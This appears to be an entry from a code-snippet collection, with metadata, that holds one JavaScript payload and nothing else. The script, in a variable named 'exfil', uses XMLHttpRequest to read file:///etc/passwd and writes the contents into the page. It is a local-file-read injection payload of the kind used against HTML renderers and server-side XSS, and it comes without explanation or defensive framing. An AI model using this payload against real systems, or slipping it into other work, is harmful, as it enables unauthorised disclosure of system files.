---
id: 7e6dd4ee-f974-4900-8c3b-e3b96e728f77
type: code
language: js
verified: false
created_at: '2023-04-06T03:56:38.080571+00:00'
updated_at: '2023-04-10T20:24:10.903477+00:00'
---

# Code Snippet 7e6dd4ee

**Language**: js

```js
<script>
    exfil = new XMLHttpRequest();
    exfil.open("GET","file:///etc/passwd");
    exfil.send();
    exfil.onload = function(){document.write(this.responseText);}
    exfil.onerror = function(){document.write('failed!')}
</script>
```
